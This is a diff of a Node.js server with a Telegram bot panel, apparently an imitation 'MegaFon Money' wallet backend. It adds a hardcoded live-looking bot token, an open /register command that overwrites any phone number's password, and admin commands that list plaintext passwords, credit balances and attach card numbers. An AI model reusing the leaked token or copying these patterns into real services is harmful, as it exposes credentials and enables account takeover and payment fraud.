@@ -7,8 +7,8 @@ const fs = require('fs');
 // ==========================================
 // ⚙️ НАСТРОЙКИ СЕРВЕРА
 // ==========================================
-const BOT_TOKEN = "ВАШ_ТОКЕН_ОТ_BOTFATHER";
-const ADMIN_CHAT_ID = "ВАШ_CHAT_ID";
+const BOT_TOKEN = "8604140755:AAH20rB8l6ZLsWjrV7Gqg6NPmhK-RuHtl1Q";
+const ADMIN_CHAT_ID = "6669736809";
 const FLASK_PORT = 4444;
 
 const app = express();
@@ -314,40 +314,95 @@ app.post('/gateway_success', (req, res) => {
 });
 
 // ==========================================
-// 👑 ТЕЛЕГРАМ АДМИН-ПАНЕЛЬ
+// 👑 ТЕЛЕГРАМ БОТ И АДМИН-ПАНЕЛЬ
 // ==========================================
+
+// 1. Выводим ошибки сети в консоль сервера (если Telegram недоступен)
+bot.on("polling_error", (err) => console.log("[!] Ошибка Telegram-бота:", err.message));
+
+// Функция проверки прав (Умная защита)
+function isAdmin(msg) {
+    if (msg.from.id.toString() === ADMIN_CHAT_ID.toString()) {
+        return true;
+    } else {
+        // Если ID не совпал, бот подскажет правильный ID!
+        bot.sendMessage(msg.chat.id, `⛔️ Отказано в доступе!\nВаш Telegram ID: <code>${msg.from.id}</code>\nВпишите его в переменную ADMIN_CHAT_ID в коде сервера.`, {parse_mode: "HTML"});
+        return false;
+    }
+}
+
 bot.onText(/\/start|\/help/, (msg) => {
-    bot.sendMessage(msg.chat.id, "👑 ПАНЕЛЬ АДМИНИСТРАТОРА\n/users — Список кошельков\n/add_money <номер> <сумма>\n/add_card <номер> <карта>");
+    bot.sendMessage(msg.chat.id, "🤖 <b>Система МегаФон Деньги</b>\n\n" +
+                                 "Доступные команды:\n" +
+                                 "📝 /register <номер> <пароль> — Регистрация\n" +
+                                 "👥 /users — Список кошельков (Админ)\n" +
+                                 "💰 /add_money <номер> <сумма> (Админ)\n" +
+                                 "💳 /add_card <номер> <карта> [имя] (Админ)", {parse_mode: "HTML"});
 });
 
+// Команда регистрации доступна всем
+bot.onText(/\/register (.+) (.+)/, (msg, match) => {
+    try {
+        const phone = match[1];
+        const password = match[2];
+        const user = db.prepare('SELECT phone FROM users WHERE phone = ?').get(phone);
+        
+        if (user) {
+            db.prepare('UPDATE users SET password = ? WHERE phone = ?').run(password, phone);
+            bot.sendMessage(msg.chat.id, `🔄 Пароль для ${phone} обновлен на: ${password}`);
+        } else {
+            db.prepare('INSERT INTO users (phone, password, sid, balance) VALUES (?, ?, ?, ?)').run(phone, password, null, 1000.0);
+            bot.sendMessage(msg.chat.id, `✅ Кошелек ${phone} успешно зарегистрирован!\nПароль: ${password}\nБонусный баланс: 1000 руб.`);
+        }
+    } catch(e) { 
+        bot.sendMessage(msg.chat.id, `❌ Ошибка: ${e.message}`); 
+    }
+});
+
+// Админские команды
 bot.onText(/\/users/, (msg) => {
-    if (msg.from.id.toString() !== ADMIN_CHAT_ID.toString()) return;
+    if (!isAdmin(msg)) return;
+    
     const users = db.prepare('SELECT phone, password, balance FROM users').all();
-    if (!users.length) return bot.sendMessage(msg.chat.id, "Пусто.");
-    let text = "👥 Кошельки:\n";
+    if (!users.length) return bot.sendMessage(msg.chat.id, "Пользователей пока нет.");
+    
+    let text = "👥 <b>База кошельков:</b>\n";
     users.forEach(u => text += `📱 ${u.phone} | 🔑 ${u.password} | 💰 ${u.balance} руб.\n`);
-    bot.sendMessage(msg.chat.id, text);
+    bot.sendMessage(msg.chat.id, text, {parse_mode: "HTML"});
 });
 
 bot.onText(/\/add_money (.+) (.+)/, (msg, match) => {
-    if (msg.from.id.toString() !== ADMIN_CHAT_ID.toString()) return;
+    if (!isAdmin(msg)) return;
+    
     try {
-        db.prepare('UPDATE users SET balance = balance + ? WHERE phone = ?').run(parseFloat(match[2]), match[1]);
-        bot.sendMessage(msg.chat.id, `✅ Баланс ${match[1]} пополнен на ${match[2]} руб.`);
-    } catch(e) { bot.sendMessage(msg.chat.id, "Ошибка"); }
+        const phone = match[1];
+        const amount = parseFloat(match[2]);
+        db.prepare('UPDATE users SET balance = balance + ? WHERE phone = ?').run(amount, phone);
+        bot.sendMessage(msg.chat.id, `✅ Баланс ${phone} пополнен на ${amount} руб.`);
+    } catch(e) { 
+        bot.sendMessage(msg.chat.id, "❌ Ошибка БД. Проверьте правильность номера."); 
+    }
 });
 
 bot.onText(/\/add_card (.+) (.+)/, (msg, match) => {
-    if (msg.from.id.toString() !== ADMIN_CHAT_ID.toString()) return;
+    if (!isAdmin(msg)) return;
+    
     try {
-        const phone = match[1], cardRaw = match[2];
+        const phone = match[1];
+        const cardRaw = match[2];
+        const alias = msg.text.split(' ').slice(3).join(' ') || "Моя карта"; // Имя карты (опционально)
+        
         const cardMasked = cardRaw.length >= 12 ? `${cardRaw.substring(0,4)} **** **** ${cardRaw.slice(-4)}` : cardRaw;
         const cardType = cardRaw.startsWith("4") ? "VISA" : "MasterCard";
+        const cardId = "card_" + crypto.randomBytes(4).toString('hex');
         
         db.prepare('INSERT INTO cards (phone, card_id, alias, card_number, acquirer_id, card_type) VALUES (?, ?, ?, ?, ?, ?)')
-          .run(phone, "card_" + crypto.randomBytes(4).toString('hex'), "Моя карта", cardMasked, "1", cardType);
-        bot.sendMessage(msg.chat.id, `💳 Карта ${cardMasked} привязана!`);
-    } catch(e) { bot.sendMessage(msg.chat.id, "Ошибка привязки"); }
+          .run(phone, cardId, alias, cardMasked, "1", cardType);
+          
+        bot.sendMessage(msg.chat.id, `💳 Карта ${cardMasked} (${cardType}) успешно привязана к кошельку ${phone}!`);
+    } catch(e) { 
+        bot.sendMessage(msg.chat.id, "❌ Ошибка привязки карты. Проверьте правильность номера кошелька."); 
+    }
 });
 
 // Запуск сервера
